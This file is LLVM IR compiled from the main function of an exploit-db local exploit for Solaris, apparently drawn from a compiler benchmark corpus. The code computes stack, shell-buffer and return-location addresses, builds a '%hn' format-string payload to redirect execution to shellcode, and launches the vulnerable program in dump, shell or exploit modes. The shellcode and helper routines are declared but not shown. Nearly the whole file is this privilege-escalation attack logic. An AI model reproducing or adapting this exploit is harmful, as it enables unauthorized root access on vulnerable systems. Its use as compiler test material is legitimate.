; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_197.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_197.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@SHELL = common dso_local global i32 0, align 4
@PATTERN = common dso_local global i32 0, align 4
@NUM = common dso_local global i32 0, align 4
@ALIGN = common dso_local global i32 0, align 4
@SHELLOFS = common dso_local global i32 0, align 4
@RETLOCOFS = common dso_local global i32 0, align 4
@RETLOC = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [5 x i8] c"dump\00", align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"shell\00", align 1
@.str.2 = private unnamed_addr constant [8 x i8] c"exploit\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"--align=%d\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"--num=%d\00", align 1
@.str.5 = private unnamed_addr constant [14 x i8] c"--shellofs=%d\00", align 1
@.str.6 = private unnamed_addr constant [15 x i8] c"--retlocofs=%d\00", align 1
@.str.7 = private unnamed_addr constant [12 x i8] c"--retloc=%x\00", align 1
@.str.8 = private unnamed_addr constant [25 x i8] c"Unrecognized option %s\0A\0A\00", align 1
@SI_PLATFORM = common dso_local global i32 0, align 4
@VULPROG = common dso_local global i8* null, align 8
@.str.9 = private unnamed_addr constant [39 x i8] c"Calculated shell buffer address: 0x%x\0A\00", align 1
@.str.10 = private unnamed_addr constant [88 x i8] c"Warning: sh_addr + align must be word aligned. Adjust shellofs and align as neccessary\0A\00", align 1
@.str.11 = private unnamed_addr constant [25 x i8] c"Calculated retloc: 0x%x\0A\00", align 1
@.str.12 = private unnamed_addr constant [44 x i8] c"Calculated shell code jump location: 0x%x\0A\0A\00", align 1
@.str.13 = private unnamed_addr constant [5 x i8] c"%.8x\00", align 1
@.str.14 = private unnamed_addr constant [35 x i8] c"Stack dump mode, dumping %d words\0A\00", align 1
@.str.15 = private unnamed_addr constant [19 x i8] c" Shell buffer: %%s\00", align 1
@.str.16 = private unnamed_addr constant [29 x i8] c"shellbuf (length = %d): %s\0A\0A\00", align 1
@.str.17 = private unnamed_addr constant [54 x i8] c"Shell buffer dump mode, shell buffer address is 0x%x\0A\00", align 1
@.str.18 = private unnamed_addr constant [19 x i8] c"%%%uc%%hn%%%uc%%hn\00", align 1
@.str.19 = private unnamed_addr constant [31 x i8] c"Exploit mode, jumping to 0x%x\0A\00", align 1
@.str.20 = private unnamed_addr constant [61 x i8] c"num: %d\09\09align: %d\09shellofs: %d\09retlocofs: %d\09retloc: 0x%x\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca [256 x i8], align 16
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca i64, align 8
  %13 = alloca i64, align 8
  %14 = alloca i64, align 8
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %25 = load i32, i32* @SHELL, align 4
  %26 = zext i32 %25 to i64
  %27 = call i8* @llvm.stacksave()
  store i8* %27, i8** %6, align 8
  %28 = alloca i8, i64 %26, align 16
  store i64 %26, i64* %7, align 8
  %29 = load i32, i32* @PATTERN, align 4
  %30 = zext i32 %29 to i64
  %31 = alloca i8, i64 %30, align 16
  store i64 %30, i64* %8, align 8
  %32 = load i32, i32* @NUM, align 4
  store i32 %32, i32* %16, align 4
  %33 = load i32, i32* @ALIGN, align 4
  store i32 %33, i32* %17, align 4
  %34 = load i32, i32* @SHELLOFS, align 4
  store i32 %34, i32* %18, align 4
  %35 = load i32, i32* @RETLOCOFS, align 4
  store i32 %35, i32* %19, align 4
  %36 = load i32, i32* @RETLOC, align 4
  store i32 %36, i32* %20, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  store i32 0, i32* %24, align 4
  %37 = load i32, i32* %4, align 4
  %38 = icmp slt i32 %37, 2
  br i1 %38, label %39, label %44

39:                                               ; preds = %2
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 0
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 @usage(i8* %42)
  br label %44

44:                                               ; preds = %39, %2
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 1
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @strncmp(i8* %47, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 4)
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %51, label %50

50:                                               ; preds = %44
  store i32 1, i32* %22, align 4
  br label %72

51:                                               ; preds = %44
  %52 = load i8**, i8*** %5, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 1
  %54 = load i8*, i8** %53, align 8
  %55 = call i32 @strncmp(i8* %54, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0), i32 5)
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %58, label %57

57:                                               ; preds = %51
  store i32 1, i32* %23, align 4
  br label %71

58:                                               ; preds = %51
  %59 = load i8**, i8*** %5, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 1
  %61 = load i8*, i8** %60, align 8
  %62 = call i32 @strncmp(i8* %61, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0), i32 7)
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %65, label %64

64:                                               ; preds = %58
  store i32 1, i32* %24, align 4
  br label %70

65:                                               ; preds = %58
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 0
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @usage(i8* %68)
  br label %70

70:                                               ; preds = %65, %64
  br label %71

71:                                               ; preds = %70, %57
  br label %72

72:                                               ; preds = %71, %50
  store i32 2, i32* %21, align 4
  br label %73

73:                                               ; preds = %133, %72
  %74 = load i32, i32* %21, align 4
  %75 = load i32, i32* %4, align 4
  %76 = icmp slt i32 %74, %75
  br i1 %76, label %77, label %136

77:                                               ; preds = %73
  %78 = load i8**, i8*** %5, align 8
  %79 = load i32, i32* %21, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8*, i8** %78, i64 %80
  %82 = load i8*, i8** %81, align 8
  %83 = call i64 @sscanf(i8* %82, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0), i32* %17)
  %84 = icmp ne i64 %83, 0
  br i1 %84, label %117, label %85

85:                                               ; preds = %77
  %86 = load i8**, i8*** %5, align 8
  %87 = load i32, i32* %21, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8*, i8** %86, i64 %88
  %90 = load i8*, i8** %89, align 8
  %91 = call i64 @sscanf(i8* %90, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i32* %16)
  %92 = icmp ne i64 %91, 0
  br i1 %92, label %117, label %93

93:                                               ; preds = %85
  %94 = load i8**, i8*** %5, align 8
  %95 = load i32, i32* %21, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8*, i8** %94, i64 %96
  %98 = load i8*, i8** %97, align 8
  %99 = call i64 @sscanf(i8* %98, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i64 0, i64 0), i32* %18)
  %100 = icmp ne i64 %99, 0
  br i1 %100, label %117, label %101

101:                                              ; preds = %93
  %102 = load i8**, i8*** %5, align 8
  %103 = load i32, i32* %21, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i8*, i8** %102, i64 %104
  %106 = load i8*, i8** %105, align 8
  %107 = call i64 @sscanf(i8* %106, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.6, i64 0, i64 0), i32* %19)
  %108 = icmp ne i64 %107, 0
  br i1 %108, label %117, label %109

109:                                              ; preds = %101
  %110 = load i8**, i8*** %5, align 8
  %111 = load i32, i32* %21, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds i8*, i8** %110, i64 %112
  %114 = load i8*, i8** %113, align 8
  %115 = call i64 @sscanf(i8* %114, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.7, i64 0, i64 0), i32* %20)
  %116 = icmp ne i64 %115, 0
  br label %117

117:                                              ; preds = %109, %101, %93, %85, %77
  %118 = phi i1 [ true, %101 ], [ true, %93 ], [ true, %85 ], [ true, %77 ], [ %116, %109 ]
  %119 = zext i1 %118 to i32
  %120 = icmp eq i32 %119, 0
  br i1 %120, label %121, label %132

121:                                              ; preds = %117
  %122 = load i8**, i8*** %5, align 8
  %123 = load i32, i32* %21, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds i8*, i8** %122, i64 %124
  %126 = load i8*, i8** %125, align 8
  %127 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.8, i64 0, i64 0), i8* %126)
  %128 = load i8**, i8*** %5, align 8
  %129 = getelementptr inbounds i8*, i8** %128, i64 0
  %130 = load i8*, i8** %129, align 8
  %131 = call i32 @usage(i8* %130)
  br label %132

132:                                              ; preds = %121, %117
  br label %133

133:                                              ; preds = %132
  %134 = load i32, i32* %21, align 4
  %135 = add nsw i32 %134, 1
  store i32 %135, i32* %21, align 4
  br label %73

136:                                              ; preds = %73
  %137 = load i32, i32* %17, align 4
  %138 = load i32, i32* %20, align 4
  %139 = call i32 @create_shellbuf(i8* %28, i32 %137, i32 %138)
  %140 = load i32, i32* @SI_PLATFORM, align 4
  %141 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %142 = call i32 @sysinfo(i32 %140, i8* %141, i32 256)
  %143 = call i32 (...) @get_sp()
  %144 = or i32 %143, 65535
  %145 = and i32 %144, -4
  %146 = zext i32 %145 to i64
  store i64 %146, i64* %11, align 8
  %147 = load i64, i64* %11, align 8
  %148 = load i8*, i8** @VULPROG, align 8
  %149 = call i32 @strlen(i8* %148)
  %150 = add nsw i32 %149, 1
  %151 = sext i32 %150 to i64
  %152 = sub nsw i64 %147, %151
  %153 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %154 = call i32 @strlen(i8* %153)
  %155 = add nsw i32 %154, 1
  %156 = sext i32 %155 to i64
  %157 = sub nsw i64 %152, %156
  %158 = call i32 @strlen(i8* %28)
  %159 = add nsw i32 %158, 1
  %160 = sext i32 %159 to i64
  %161 = sub nsw i64 %157, %160
  %162 = load i32, i32* %18, align 4
  %163 = sext i32 %162 to i64
  %164 = add nsw i64 %161, %163
  store i64 %164, i64* %12, align 8
  %165 = load i64, i64* %12, align 8
  %166 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.9, i64 0, i64 0), i64 %165)
  %167 = load i32, i32* %23, align 4
  %168 = icmp eq i32 %167, 1
  br i1 %168, label %169, label %176

169:                                              ; preds = %136
  %170 = load i32, i32* %17, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds i8, i8* %28, i64 %171
  %173 = load i64, i64* %12, align 8
  %174 = trunc i64 %173 to i32
  %175 = call i32 @put_long(i8* %172, i32 %174)
  br label %176

176:                                              ; preds = %169, %136
  %177 = load i64, i64* %12, align 8
  %178 = load i32, i32* %17, align 4
  %179 = sext i32 %178 to i64
  %180 = add nsw i64 %177, %179
  %181 = and i64 %180, 4294967292
  %182 = load i64, i64* %12, align 8
  %183 = load i32, i32* %17, align 4
  %184 = sext i32 %183 to i64
  %185 = add nsw i64 %182, %184
  %186 = icmp ne i64 %181, %185
  br i1 %186, label %187, label %189

187:                                              ; preds = %176
  %188 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.10, i64 0, i64 0))
  br label %189

189:                                              ; preds = %187, %176
  %190 = load i32, i32* %20, align 4
  %191 = load i32, i32* @RETLOC, align 4
  %192 = icmp eq i32 %190, %191
  br i1 %192, label %193, label %221

193:                                              ; preds = %189
  %194 = load i64, i64* %12, align 8
  %195 = load i32, i32* %17, align 4
  %196 = sext i32 %195 to i64
  %197 = add nsw i64 %194, %196
  %198 = load i32, i32* %16, align 4
  %199 = mul nsw i32 %198, 4
  %200 = sext i32 %199 to i64
  %201 = sub nsw i64 %197, %200
  %202 = load i32, i32* %19, align 4
  %203 = sext i32 %202 to i64
  %204 = add nsw i64 %201, %203
  %205 = trunc i64 %204 to i32
  store i32 %205, i32* %20, align 4
  %206 = load i32, i32* %20, align 4
  %207 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.11, i64 0, i64 0), i32 %206)
  %208 = load i32, i32* %17, align 4
  %209 = add nsw i32 %208, 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds i8, i8* %28, i64 %210
  %212 = load i32, i32* %20, align 4
  %213 = call i32 @put_long(i8* %211, i32 %212)
  %214 = load i32, i32* %17, align 4
  %215 = add nsw i32 %214, 12
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds i8, i8* %28, i64 %216
  %218 = load i32, i32* %20, align 4
  %219 = add nsw i32 %218, 2
  %220 = call i32 @put_long(i8* %217, i32 %219)
  br label %221

221:                                              ; preds = %193, %189
  %222 = load i64, i64* %12, align 8
  %223 = load i32, i32* %17, align 4
  %224 = sext i32 %223 to i64
  %225 = add nsw i64 %222, %224
  %226 = add nsw i64 %225, 64
  store i64 %226, i64* %13, align 8
  %227 = load i64, i64* %13, align 8
  %228 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.12, i64 0, i64 0), i64 %227)
  store i8* %31, i8** %10, align 8
  store i32 0, i32* %21, align 4
  br label %229

229:                                              ; preds = %238, %221
  %230 = load i32, i32* %21, align 4
  %231 = load i32, i32* %16, align 4
  %232 = icmp slt i32 %230, %231
  br i1 %232, label %233, label %241

233:                                              ; preds = %229
  %234 = load i8*, i8** %10, align 8
  %235 = call i32 @memcpy(i8* %234, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.13, i64 0, i64 0), i32 4)
  %236 = load i8*, i8** %10, align 8
  %237 = getelementptr inbounds i8, i8* %236, i64 4
  store i8* %237, i8** %10, align 8
  br label %238

238:                                              ; preds = %233
  %239 = load i32, i32* %21, align 4
  %240 = add nsw i32 %239, 1
  store i32 %240, i32* %21, align 4
  br label %229

241:                                              ; preds = %229
  %242 = load i32, i32* %22, align 4
  %243 = icmp eq i32 %242, 1
  br i1 %243, label %244, label %248

244:                                              ; preds = %241
  %245 = load i8*, i8** %10, align 8
  store i8 0, i8* %245, align 1
  %246 = load i32, i32* %16, align 4
  %247 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.14, i64 0, i64 0), i32 %246)
  br label %279

248:                                              ; preds = %241
  %249 = load i32, i32* %23, align 4
  %250 = icmp eq i32 %249, 1
  br i1 %250, label %251, label %259

251:                                              ; preds = %248
  %252 = load i8*, i8** %10, align 8
  %253 = call i32 (i8*, i8*, ...) @sprintf(i8* %252, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.15, i64 0, i64 0))
  %254 = call i32 @strlen(i8* %28)
  %255 = add nsw i32 %254, 1
  %256 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.16, i64 0, i64 0), i32 %255, i8* %28)
  %257 = load i64, i64* %12, align 8
  %258 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.17, i64 0, i64 0), i64 %257)
  br label %278

259:                                              ; preds = %248
  %260 = load i64, i64* %13, align 8
  %261 = ashr i64 %260, 16
  %262 = and i64 %261, 65535
  store i64 %262, i64* %14, align 8
  %263 = load i64, i64* %13, align 8
  %264 = ashr i64 %263, 0
  %265 = and i64 %264, 65535
  store i64 %265, i64* %15, align 8
  %266 = load i8*, i8** %10, align 8
  %267 = load i64, i64* %14, align 8
  %268 = load i32, i32* %16, align 4
  %269 = mul nsw i32 %268, 8
  %270 = sext i32 %269 to i64
  %271 = sub nsw i64 %267, %270
  %272 = load i64, i64* %15, align 8
  %273 = load i64, i64* %14, align 8
  %274 = sub nsw i64 %272, %273
  %275 = call i32 (i8*, i8*, ...) @sprintf(i8* %266, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.18, i64 0, i64 0), i64 %271, i64 %274)
  %276 = load i64, i64* %13, align 8
  %277 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.19, i64 0, i64 0), i64 %276)
  br label %278

278:                                              ; preds = %259, %251
  br label %279

279:                                              ; preds = %278, %244
  %280 = load i32, i32* %16, align 4
  %281 = load i32, i32* %17, align 4
  %282 = load i32, i32* %18, align 4
  %283 = load i32, i32* %19, align 4
  %284 = load i32, i32* %20, align 4
  %285 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.20, i64 0, i64 0), i32 %280, i32 %281, i32 %282, i32 %283, i32 %284)
  %286 = call i32 @execute_vulnprog(i8* %31, i8* %28)
  %287 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %287)
  %288 = load i32, i32* %3, align 4
  ret i32 %288
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @usage(i8*) #2

declare dso_local i32 @strncmp(i8*, i8*, i32) #2

declare dso_local i64 @sscanf(i8*, i8*, i32*) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @create_shellbuf(i8*, i32, i32) #2

declare dso_local i32 @sysinfo(i32, i8*, i32) #2

declare dso_local i32 @get_sp(...) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @put_long(i8*, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @sprintf(i8*, i8*, ...) #2

declare dso_local i32 @execute_vulnprog(i8*, i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
